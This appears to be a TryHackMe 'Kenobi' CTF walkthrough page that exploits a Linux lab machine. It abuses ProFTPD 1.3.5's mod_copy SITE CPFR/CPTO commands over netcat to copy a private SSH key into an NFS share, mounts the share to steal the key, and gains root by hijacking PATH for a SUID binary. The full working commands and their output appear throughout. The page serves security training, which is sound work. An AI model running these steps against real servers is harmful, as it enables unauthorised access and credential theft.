---
sidebar_position: 2
title: Kenobi 
sidebar_label: Exploitation
description: Walkthrough on exploiting a Linux machine. Enumerate Samba for shares, manipulate a vulnerable version of ProFTPD and escalate your privileges with path variable manipulation.
keywords: [kenobi, tryhackme, ctf, pentesting, guide, docs, tutorial, enumeration, exploitation, nmap, enum4linux, smbmap, smbclient, privilege escalation, proftpd 1.3.5, mod_copy exploit, nfs]
---

import Tabs from '@theme/Tabs';
import TabItem from '@theme/TabItem';


## ProFTPD

<b style={{ color: 'Plum' }}>ProFTPD Version:</b> <b style={{ color: 'Red' }}>1.3.5</b> <span style={{fontWeight: 'Bold'}}>[Vulnerability: MOD_COPY Module]</span> 

<br/>
<br/>

Since we know that the <span style={{fontWeight: 'Bold'}}>User:</span> <b style={{ color: 'LightGreen' }}>Kenobi</b> uses `SSH` we can Copy hes Keys into the `NFS Shared Directory` using the **MOD_COPY Module Vulnerability.** After that we can **Mount** it and Read the `Private SSH Key`

<br/>

- The `NFS Share` is Mounted in `/var`
- The `/var` Direcotry has a `tmp` Directory we can copy the `Private SSH Key` to that Location

```bash
attacker@machine:~$ showmount -e 10.10.118.63
Export list for 10.10.118.63:
/var *
```

<br/>

- **We can Connect using `Netcat`**
- **Copying the `Private SSH Key` into the `NFS Share:`**


```log
attacker@machine:~$ nc 10.10.118.63 21 
220 ProFTPD 1.3.5 Server (ProFTPD Default Installation) [10.10.118.63]
// highlight-next-line
SITE CPFR /home/kenobi/.ssh/id_rsa
350 File or directory exists, ready for destination name
// highlight-next-line
SITE CPTO /var/tmp/id_rsa
250 Copy successful
```

## NFS 

- Mounting the **NFS** Shared Directory

```bash
attacker@machine:~$ mkdir NFS
attacker@machine:~$ mount -t nfs 10.10.118.63:/var NFS -o nolock
```

- Copying the Contents of **`id_rsa`** File

```bash
attacker@machine:~$ ls NFS
drwxr-xr-x  2 root root  4096  4 set  2019 backups
drwxr-xr-x  9 root root  4096  4 set  2019 cache
drwxrwxrwt  2 root root  4096  4 set  2019 crash
drwxr-xr-x 40 root root  4096  4 set  2019 lib
drwxrwsr-x  2 root games 4096 12 apr  2016 local
lrwxrwxrwx  1 root root     9  4 set  2019 lock -> /run/lock
drwxrwxr-x 10 root       4096  4 set  2019 log
drwxrwsr-x  2 root mem   4096 27 feb  2019 mail
drwxr-xr-x  2 root root  4096 27 feb  2019 opt
lrwxrwxrwx  1 root root     4  4 set  2019 run -> /run
drwxr-xr-x  2 root root  4096 30 gen  2019 snap
drwxr-xr-x  5 root root  4096  4 set  2019 spool
drwxrwxrwt  6 root root  4096  7 ott 08.36 tmp
drwxr-xr-x  3 root root  4096  4 set  2019 www
```

```bash
attacker@machine:~$ ls NFS/tmp
-rw-r--r-- 1 virtualbox virtualbox 1675 12 mag 02.44 id_rsa
attacker@machine:~$ cp NFS/tmp/id_rsa ~
```

<br/>



:::tip Assign The Correct Permissions To ID_RSA

<Tabs>
  <TabItem value="chmod" label="Permissions"> 
    <div style={{color: 'red'}}>

```bash
chmod 600 id_rsa
```

</div>
  </TabItem>
  <TabItem value="other" label="SSH"> 
    <div style={{color: 'red'}}>

```bash
ssh -i id_rsa kenobi@VICTIM_IP
```

</div>
  </TabItem>
</Tabs>

:::


<br/>

---
## Privilege Escalation

- **We can Login using the `Private SSH Key`**

```bash
kenobi@kenobi:~$ id
uid=1000(kenobi) gid=1000(kenobi) groups=1000(kenobi),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev),110(lxd),113(lpadmin),114(sambashare)
```

<br/>

- The <b style={{ color: 'Coral' }}>/usr/bin/menu</b> Binary has the <b style={{ color: 'Red' }}>SUID</b> Bit Set. 

```bash
kenobi@kenobi:~$ find / -type f -perm -04000 -ls 2>/dev/null
   ...
   280011     12 -rwsr-xr-x   1 root     root           8880 Sep  4  2019 /usr/bin/menu
   ...
```

<br/>

- **The Script is using System Commands `CURL - UNAME - IFCONFIG.`** We can Escalate our Privileges using `Path Variable Manipulation.`

```bash
kenobi@kenobi:~$ /usr/bin/menu
***************************************
1. status check
2. kernel version
3. ifconfig
** Enter your choice :
```


```bash
kenobi@kenobi:/tmp$ export PATH=/tmp:$PATH
kenobi@kenobi:/tmp$ echo "/bin/bash" > ifconfig && chmod 4777 ifconfig
```

```bash
kenobi@kenobi:/tmp$ /usr/bin/menu
1. status check
2. kernel version
3. ifconfig
** Enter your choice :3

root@kenobi:/tmp$ id
uid=0(root) gid=1000(kenobi) groups=1000(kenobi),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev),110(lxd),113(lpadmin),114(sambashare)
root@kenobi:/tmp$ whoami
root
```

---